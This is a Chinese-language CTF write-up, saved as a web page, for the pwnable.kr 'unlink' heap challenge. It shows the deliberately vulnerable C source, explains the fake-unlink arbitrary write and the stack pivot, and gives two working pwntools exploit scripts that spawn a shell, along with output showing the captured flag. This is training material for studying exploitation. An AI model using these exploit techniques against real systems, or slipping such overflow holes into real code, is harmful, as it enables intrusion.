@@ -1,0 +1,666 @@
+<!DOCTYPE html>
+<!-- saved from url=(0052)https://www.lxpark.com/ctf/pwnable-kr-unlink-writeup -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<script type="text/javascript" src="./Pwnable.kr Unlink Writeup_files/jquery.js"></script>
+
+
+
+        <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+        <meta content="yes" name="apple-mobile-web-app-capable">
+        <meta content="black" name="apple-mobile-web-app-status-bar-style">
+        <meta content="telephone=no" name="format-detection">
+        <meta name="renderer" content="webkit">
+<meta name="keywords" content="CTF Blog 编程">
+<meta name="description" content="CTF,网络空间安全,程序设计,程序开发,人生观.">
+
+
+
+
+<title>Pwnable.kr Unlink Writeup</title>
+
+
+<link href="./Pwnable.kr Unlink Writeup_files/font-awesome.min.css" type="text/css" rel="stylesheet"><link href="./Pwnable.kr Unlink Writeup_files/base.scss" type="text/css" rel="stylesheet"><link href="./Pwnable.kr Unlink Writeup_files/style.scss" type="text/css" rel="stylesheet"><link href="./Pwnable.kr Unlink Writeup_files/highlight.scss" type="text/css" rel="stylesheet">
+
+  <style type="text/css"></style><meta name="wecite_data" id="wecite-data" content="{&quot;Title&quot;:&quot;Pwnable.kr Unlink Writeup&quot;,&quot;Author&quot;:&quot;&quot;,&quot;Abstract&quot;:&quot;&quot;,&quot;Image&quot;:&quot;&quot;,&quot;Keywords&quot;:&quot;&quot;,&quot;src_likes&quot;:&quot;0&quot;,&quot;src_shares&quot;:&quot;0&quot;,&quot;src_comments&quot;:&quot;0&quot;,&quot;src_reads&quot;:&quot;0&quot;,&quot;src_up&quot;:&quot;0&quot;,&quot;src_down&quot;:&quot;0&quot;,&quot;DateTime&quot;:&quot;2017-07-31 15:43:07&quot;,&quot;Reference Type&quot;:&quot;Web Page&quot;,&quot;Year&quot;:2017,&quot;SiteType&quot;:&quot;c3&quot;,&quot;URL&quot;:&quot;https://www.lxpark.com/ctf/pwnable-kr-unlink-writeup&quot;}"></head>
+
+  <body>
+    <div class="header">
+
+
+<div class="header_container">
+  <h1><a href="https://www.lxpark.com/" class="site_name">Park St.</a>
+
+  </h1>
+  <nav class="navbar">
+
+
+
+<span>
+
+
+
+<a href="https://www.lxpark.com/?status=loaded">首页</a>
+</span>
+
+<span>|
+
+
+<a href="https://www.lxpark.com/p/peace">纯音</a>
+</span>
+
+<span>|
+
+
+<a href="https://www.lxpark.com/p/links">友链</a>
+</span>
+
+<span>|
+
+
+<a href="https://www.lxpark.com/p/about">关于</a>
+</span>
+
+
+
+
+  </nav>
+
+</div>
+
+
+
+
+    </div>
+
+    <div class="main">
+
+
+
+
+
+
+
+
+<div class="post_detail_container">
+  <h1 class="post_detail_title">Pwnable.kr Unlink Writeup</h1>
+
+  <div class="post_detail_content"><div class="toc"><ul>
+<li>
+<a href="https://www.lxpark.com/ctf/pwnable-kr-unlink-writeup#toc_0">题目</a>
+</li>
+<li>
+<a href="https://www.lxpark.com/ctf/pwnable-kr-unlink-writeup#toc_1">分析</a>
+<ul>
+<li>
+<a href="https://www.lxpark.com/ctf/pwnable-kr-unlink-writeup#toc_2">漏洞</a>
+</li>
+<li>
+<a href="https://www.lxpark.com/ctf/pwnable-kr-unlink-writeup#toc_3">利用方法</a>
+</li>
+<li>
+<a href="https://www.lxpark.com/ctf/pwnable-kr-unlink-writeup#toc_4">利用代码</a>
+</li>
+<li>
+<a href="https://www.lxpark.com/ctf/pwnable-kr-unlink-writeup#toc_5">结果</a>
+</li>
+</ul>
+</li>
+<li>
+<a href="https://www.lxpark.com/ctf/pwnable-kr-unlink-writeup#toc_6">附录</a>
+</li>
+</ul>
+</div><p class="md_block">
+    <span class="md_line">这是dlmalloc Unlink的一个模拟，且提供了栈和堆的地址，总体来说是比较简单的。但是还是有一些需要注意的地方。</span>
+</p>
+
+
+<h1 id="toc_0">题目</h1>
+
+<blockquote>
+
+<p class="md_block">
+    <span class="md_line">Daddy! how can I exploit unlink corruption?</span>
+</p>
+
+
+<p class="md_block">
+    <span class="md_line">ssh unlink@pwnable.kr -p2222 (pw: guest)</span>
+</p>
+
+</blockquote>
+
+<p class="md_block">
+    <span class="md_line">攻击以下代码编译的程序，获取shell。</span>
+</p>
+
+<div class="codehilite code_lang_c  highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
+<span class="k">typedef</span> <span class="k">struct</span> <span class="n">tagOBJ</span><span class="p">{</span>
+    <span class="k">struct</span> <span class="n">tagOBJ</span><span class="o">*</span> <span class="n">fd</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">tagOBJ</span><span class="o">*</span> <span class="n">bk</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+<span class="p">}</span><span class="n">OBJ</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">shell</span><span class="p">(){</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">unlink</span><span class="p">(</span><span class="n">OBJ</span><span class="o">*</span> <span class="n">P</span><span class="p">){</span>
+    <span class="n">OBJ</span><span class="o">*</span> <span class="n">BK</span><span class="p">;</span>
+    <span class="n">OBJ</span><span class="o">*</span> <span class="n">FD</span><span class="p">;</span>
+    <span class="n">BK</span><span class="o">=</span><span class="n">P</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
+    <span class="n">FD</span><span class="o">=</span><span class="n">P</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
+    <span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span><span class="o">=</span><span class="n">BK</span><span class="p">;</span>
+    <span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span><span class="o">=</span><span class="n">FD</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
+    <span class="n">malloc</span><span class="p">(</span><span class="mi">1024</span><span class="p">);</span>
+    <span class="n">OBJ</span><span class="o">*</span> <span class="n">A</span> <span class="o">=</span> <span class="p">(</span><span class="n">OBJ</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">OBJ</span><span class="p">));</span>
+    <span class="n">OBJ</span><span class="o">*</span> <span class="n">B</span> <span class="o">=</span> <span class="p">(</span><span class="n">OBJ</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">OBJ</span><span class="p">));</span>
+    <span class="n">OBJ</span><span class="o">*</span> <span class="n">C</span> <span class="o">=</span> <span class="p">(</span><span class="n">OBJ</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">OBJ</span><span class="p">));</span>
+
+    <span class="c1">// double linked list: A &lt;-&gt; B &lt;-&gt; C</span>
+    <span class="n">A</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">B</span><span class="p">;</span>
+    <span class="n">B</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">A</span><span class="p">;</span>
+    <span class="n">B</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">C</span><span class="p">;</span>
+    <span class="n">C</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">B</span><span class="p">;</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"here is stack address leak: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">A</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"here is heap address leak: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">A</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"now that you have leaks, get shell!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="c1">// heap overflow!</span>
+    <span class="n">gets</span><span class="p">(</span><span class="n">A</span><span class="o">-&gt;</span><span class="n">buf</span><span class="p">);</span>
+
+    <span class="c1">// exploit this unlink!</span>
+    <span class="n">unlink</span><span class="p">(</span><span class="n">B</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+
+<!--block_code_end-->
+<h1 id="toc_1">分析</h1>
+
+<h2 id="toc_2">漏洞</h2>
+
+<p class="md_block">
+    <span class="md_line">这个源码里面还有注释，提示算是很明显的了，<code>gets(A-&gt;buf)</code>一句存在堆溢出，然后如果溢出，P内的两个指针被覆盖，在<code>unlink(P)</code>时就可能发生一个任意地址写。</span>
+</p>
+
+<div class="codehilite code_lang_c  highlight"><pre><span></span><span class="kt">void</span> <span class="nf">unlink</span><span class="p">(</span><span class="n">OBJ</span><span class="o">*</span> <span class="n">P</span><span class="p">){</span>
+    <span class="n">OBJ</span><span class="o">*</span> <span class="n">BK</span><span class="p">;</span>
+    <span class="n">OBJ</span><span class="o">*</span> <span class="n">FD</span><span class="p">;</span>
+    <span class="n">BK</span><span class="o">=</span><span class="n">P</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
+    <span class="n">FD</span><span class="o">=</span><span class="n">P</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
+    <span class="c1">// 这是两个危险的写入操作。</span>
+    <span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span><span class="o">=</span><span class="n">BK</span><span class="p">;</span>
+    <span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span><span class="o">=</span><span class="n">FD</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+
+<!--block_code_end-->
+<h2 id="toc_3">利用方法</h2>
+
+<p class="md_block">
+    <span class="md_line">只需要令：</span>
+</p>
+
+<div class="codehilite code_lang_c  highlight"><pre><span></span><span class="n">P</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">A</span><span class="p">;</span>
+<span class="n">P</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">B</span><span class="p">;</span>
+</pre></div>
+
+<!--block_code_end-->
+<p class="md_block">
+    <span class="md_line">那么<code>unlink</code>时就会发生这样的写操作：</span>
+</p>
+
+<div class="codehilite code_lang_c  highlight"><pre><span></span><span class="n">A</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">B</span><span class="p">;</span>
+<span class="n">B</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">A</span><span class="p">;</span>
+</pre></div>
+
+<!--block_code_end-->
+<p class="md_block">
+    <span class="md_line">由于<code>fd</code>、<code>bk</code>两个参数在结构体中分别处于偏移<code>0x0</code>和<code>0x4</code>的位置，所以实际上这个写操作相当于：</span>
+</p>
+
+<div class="codehilite code_lang_c  highlight"><pre><span></span><span class="o">*</span><span class="p">(</span><span class="n">A</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">=</span> <span class="n">B</span><span class="p">;</span>
+<span class="o">*</span><span class="n">B</span> <span class="o">=</span> <span class="n">A</span><span class="p">;</span>
+</pre></div>
+
+<!--block_code_end-->
+<p class="md_block">
+    <span class="md_line">能够控制A、B，就能控制这两个写入。</span>
+</p>
+
+
+<p class="md_block">
+    <span class="md_line">题目提供了一个<code>shell</code>函数，要想办法调用这个函数获取shell。</span>
+</p>
+
+
+<p class="md_block">
+    <span class="md_line">一开始很容易就想到，通过提供的栈地址写入某个函数的返回地址。</span>
+</p>
+
+
+<p class="md_block">
+    <span class="md_line">但是这里的写入有一个问题，因为它是对两个地址写，所以必须保证<strong>两个地址都可写</strong>。如果要覆盖返回地址，其中一个地址一定是可执行的，对于开启NX保护的程序，它又是不可写的。</span>
+</p>
+
+
+<p class="md_block">
+    <span class="md_line">所以只能通过<strong>栈迁移</strong>来实现。</span>
+</p>
+
+
+<p class="md_block">
+    <span class="md_line">通过逆向<code>main</code>函数，发现在尾部有这样一段代码：</span>
+</p>
+
+
+<pre class="lang_assembly"><code>.text:080485FF   mov     ecx, [ebp-4]
+.text:08048602   leave
+.text:08048603   lea     esp, [ecx-4]
+.text:08048606   retn</code></pre>
+
+<!--block_code_end-->
+<p class="md_block">
+    <span class="md_line">这不就直接控制了<code>esp</code>了么。所以只需要通过任意地址写，控制<code>ebp-4</code>地址上的值，就能控制<code>ecx</code>的值，进而控制<code>esp</code>的值。</span>
+</p>
+
+
+<p class="md_block">
+    <span class="md_line">而且注意到<code>lea esp, [ecx-4]</code>之后，立即就是一个<code>ret</code>，所以只需要找一块可写的空间，写入<code>shell</code>的地址，然后将<code>esp</code>指向这个地方，这就控制了执行流执行<code>shell</code>。</span>
+</p>
+
+
+<p class="md_block">
+    <span class="md_line">这个可写地址很明显可以用堆上的空间。</span>
+</p>
+
+
+<p class="md_block">
+    <span class="md_line">最终的溢出payload结构应当是这样的：</span>
+</p>
+
+
+<pre><code>shell_addr
+AAAA
+AAAA
+AAAA (Padding)
+heap_leak + 12
+stack_leak + 0x10</code></pre>
+
+<!--block_code_end-->
+<ul>
+<li class="md_li">倒数第二行的12，是由于<code>gets</code>读取的数据从<code>heap_leak+8</code>开始，而<code>ecx</code>存入<code>esp</code>时减去了4，所以需要加上4。
+</li>
+<li class="md_li">倒数第一行的0x10是通过gdb调试得到<code>stack_leak</code>和执行<code>mov ecx, [ebp-4]</code>语句时<code>ebp-4</code>之间的偏移。
+</li>
+</ul>
+
+<h2 id="toc_4">利用代码</h2>
+<div class="codehilite code_lang_python  highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">'./unlink'</span><span class="p">)</span>
+<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'./unlink'</span><span class="p">)</span>
+
+<span class="n">shell_addr</span> <span class="o">=</span> <span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'shell'</span><span class="p">]</span>
+
+<span class="c1"># Get leaks</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'here is stack address leak: '</span><span class="p">)</span>
+<span class="n">stack_leak_addr</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'here is heap address leak: '</span><span class="p">)</span>
+<span class="n">heap_leak_addr</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>
+
+<span class="k">print</span> <span class="n">stack_leak_addr</span><span class="p">,</span> <span class="n">heap_leak_addr</span>
+<span class="n">stack_leak_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">stack_leak_addr</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">heap_leak_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">heap_leak_addr</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">ecx_mov_addr</span> <span class="o">=</span> <span class="n">stack_leak_addr</span> <span class="o">+</span> <span class="mh">0x10</span> 
+<span class="c1"># 0xffffd134 0x804b410 0xffffd144</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'now that you have leaks, get shell!</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
+
+<span class="k">print</span> <span class="n">pidof</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+<span class="nb">raw_input</span><span class="p">()</span>
+
+<span class="c1"># exp</span>
+<span class="n">x</span>  <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">shell_addr</span><span class="p">)</span>
+<span class="n">x</span> <span class="o">+=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">16</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">x</span><span class="p">))</span>
+<span class="n">x</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">heap_leak_addr</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span>
+<span class="n">x</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">ecx_mov_addr</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+
+<!--block_code_end-->
+<h2 id="toc_5">结果</h2>
+<div class="codehilite code_lang_sh  highlight"><pre><span></span>unlink@ubuntu:~$ python /tmp/go.py
+<span class="o">[</span>+<span class="o">]</span> Starting <span class="nb">local</span> process <span class="s1">'./unlink'</span>: Done
+<span class="o">[</span>*<span class="o">]</span> <span class="s1">'/home/unlink/unlink'</span>
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE
+0xffc768a4 0x9301410
+<span class="o">[</span>6447<span class="o">]</span>
+
+<span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
+$ id
+<span class="nv">uid</span><span class="o">=</span>1094<span class="o">(</span>unlink<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1094<span class="o">(</span>unlink<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>1095<span class="o">(</span>unlink_pwn<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1095<span class="o">(</span>unlink_pwn<span class="o">)</span>,1094<span class="o">(</span>unlink<span class="o">)</span>
+$ cat flag
+conditional_write_xxxxxxxxxxxxxxxxxxxxxxx
+</pre></div>
+
+<!--block_code_end-->
+<h1 id="toc_6">附录</h1>
+
+<p class="md_block">
+    <span class="md_line">解题后目录下还提供了一个“正解”：</span>
+</p>
+
+<div class="codehilite code_lang_python  highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">'i386'</span>    <span class="c1"># i386 / arm</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s1">'/home/unlink/unlink'</span><span class="p">])</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'shell!</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
+<span class="n">stack</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'leak: 0x'</span><span class="p">)[</span><span class="mi">1</span><span class="p">][:</span><span class="mi">8</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">heap</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'leak: 0x'</span><span class="p">)[</span><span class="mi">2</span><span class="p">][:</span><span class="mi">8</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">shell</span> <span class="o">=</span> <span class="mh">0x80484eb</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="n">shell</span><span class="p">)</span>        <span class="c1"># heap + 8  (new ret addr)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">heap</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span>    <span class="c1"># heap + 12 (this -4 becomes ESP at ret)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'3333'</span>        <span class="c1"># heap + 16</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'4444'</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">stack</span> <span class="o">-</span> <span class="mh">0x20</span><span class="p">)</span>    <span class="c1"># eax. (address of old ebp of unlink) -4</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">heap</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span>    <span class="c1"># edx.</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span> <span class="n">payload</span> <span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+
+<!--block_code_end-->
+    <p class="post_detail_content_end">- END -</p>
+</div>
+
+
+
+  <p class="post_detail_tags"><i class="fa fa-tags"></i>
+
+
+<span></span>
+<a href="https://www.lxpark.com/tag/CTF">CTF</a>
+<span></span>
+
+<a href="https://www.lxpark.com/tag/Pwn">Pwn</a>
+<span></span>
+
+<a href="https://www.lxpark.com/tag/Unlink">Unlink</a>
+<span></span>
+
+<a href="https://www.lxpark.com/tag/%E5%A0%86">堆</a>
+<span></span>
+
+<a href="https://www.lxpark.com/tag/Pwnable.kr">Pwnable.kr</a>
+<span></span>
+
+
+  </p>
+
+
+</div>
+
+<div id="comments" class="comments_container">
+
+<link href="./Pwnable.kr Unlink Writeup_files/style.css" type="text/css" rel="stylesheet">
+
+<div class="doc_comments">
+  <div class="doc_comments_wrapper">
+    <div class="comments_block_title">Comments</div>
+
+    <div class="new_comment_form_container">
+      <form id="new_comment_form" method="post" action="https://www.lxpark.com/service/comment/new">
+        <input name="path" type="hidden" value="ctf/pwnable-kr-unlink-writeup.md">
+
+        <input id="reply_to_id" name="reply" type="hidden" value="">
+        <div class="comment_trigger">
+          <div class="avatar"><img src="./Pwnable.kr Unlink Writeup_files/visitor.png">
+
+          </div>
+
+          <div class="trigger_title">Write a Comment</div>
+
+        </div>
+
+        <div class="new_comment"><textarea name="content" rows="2" class="textarea_box"></textarea>
+<span class="comment_error"></span>
+
+        </div>
+
+        <div class="comment_triggered">
+          <div class="input_body">
+            <ul class="ident">
+              <li>
+                <input type="text" name="author" placeholder="Name">
+
+              </li>
+
+              <li>
+                <input type="text" name="email" placeholder="Email">
+
+              </li>
+
+              <li>
+                <input type="text" name="site" placeholder="Website">
+
+              </li>
+
+            </ul>
+
+
+            <input type="submit" value="Submit!" class="comment_submit_button c_button">
+
+          </div>
+
+        </div>
+
+      </form>
+
+    </div>
+
+    <ul class="comments">
+    </ul>
+
+<script type="text/javascript" src="./Pwnable.kr Unlink Writeup_files/js.cookie.js"></script>
+<script type="text/javascript" src="./Pwnable.kr Unlink Writeup_files/jquery.textcomplete.min.js"></script>
+<script type="text/javascript" src="./Pwnable.kr Unlink Writeup_files/script.js"></script>
+
+    <script>var people=[
+    "lzhtony"
+]</script>
+
+    <script>$(".new_comment textarea").textcomplete([{
+    match: /@(\S*)$/,
+    search: function(term, callback){
+        callback($.map(people, function(person){
+            return person.indexOf(term)==0 ? person : null
+        }))
+    },
+    replace: function(value){
+        if (value.indexOf(' ')!='-1'){
+            return '@' + value + ', ';
+        }
+        else{
+            return '@' + value + ' ';
+        }
+    },
+    index: 1
+}]);
+</script>
+  </div>
+
+</div>
+
+
+
+</div>
+
+<!--include ui/back_to_top.jade-->
+
+<style type="text/css">a.back_to_top {
+    text-decoration: none;
+    position: fixed;
+    bottom: 40px;
+    right: 30px;
+    background: #f0f0f0;
+    height: 40px;
+    width: 40px;
+    border-radius: 50%;
+    line-height: 36px;
+    font-size: 18px;
+    text-align: center;
+    transition-duration: .5s;
+    transition-propety: background-color;
+    display: none;
+}
+
+a.back_to_top span {
+    color: #888;
+}
+
+a.back_to_top:hover {
+    cursor: pointer;
+    background: #dfdfdf;
+}
+
+a.back_to_top:hover span {
+    color: #555;
+}
+
+@media print, screen and (max-width: 580px) {
+    .back_to_top {
+        display: none !important;
+    }
+}
+
+
+
+</style><a id="back_to_top" href="https://www.lxpark.com/ctf/pwnable-kr-unlink-writeup#" class="back_to_top" style="display: block;"><span><i class="fa fa-chevron-up"></i></span>
+</a>
+
+
+<script>$(document).ready((function(_this) {
+  return function() {
+    var bt;
+    bt = $('#back_to_top');
+    if ($(document).width() > 480) {
+      $(window).scroll(function() {
+        var st;
+        st = $(window).scrollTop();
+        if (st > 30) {
+          return bt.css('display', 'block');
+        } else {
+          return bt.css('display', 'none');
+        }
+      });
+      return bt.click(function() {
+        $('body,html').animate({
+          scrollTop: 0
+        }, 800);
+        return false;
+      });
+    }
+  };
+})(this));
+</script>
+
+
+
+    </div>
+
+    <div class="pager">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="pager_container">
+  <p class="direct_indicator"><a href="https://www.lxpark.com/electronics/stm32-cube-problems" class="prev_page"><i class="fa fa-arrow-left"></i>
+<span> STM32103C8+STM32CubeMX学习问题记录</span>
+</a>
+
+
+<a href="https://www.lxpark.com/ctf/pwnable-kr-uaf-writeup" class="next_page"><span>Pwnable.kr UAF Writeup </span>
+<i class="fa fa-arrow-right"></i>
+</a>
+
+
+
+  </p>
+
+</div>
+
+
+
+
+
+
+    </div>
+
+    <div class="footer">
+
+
+<div class="footer_container">
+  <p class="copyright">©
+
+
+
+
+
+
+
+
+
+
+
+
+<span>2016-2017 </span>
+<a href="https://www.lxpark.com/" class="footer_site_title">Park St.</a>
+<span class="footer_navbar"><span class="header_nav_categories hidden_on_small">|
+<a href="https://www.lxpark.com/categories">Categories</a>
+</span>
+<span class="header_nav_tags hidden_on_small">|
+<a href="https://www.lxpark.com/tags">Tags</a>
+</span>
+<span class="header_nav_archive hidden_on_small">|
+<a href="https://www.lxpark.com/archive">Archives</a>
+</span>
+</span>
+
+
+  </p>
+
+</div>
+
+
+
+
+    </div>
+
+  
+
+<script type="text/javascript" src="chrome-extension://jofjnbepnhcbfnpbhchillofcgpeopaj/js/public/common.js"></script><script type="text/javascript" src="chrome-extension://jofjnbepnhcbfnpbhchillofcgpeopaj/js/common/we-general.js"></script></body><div></div></html>
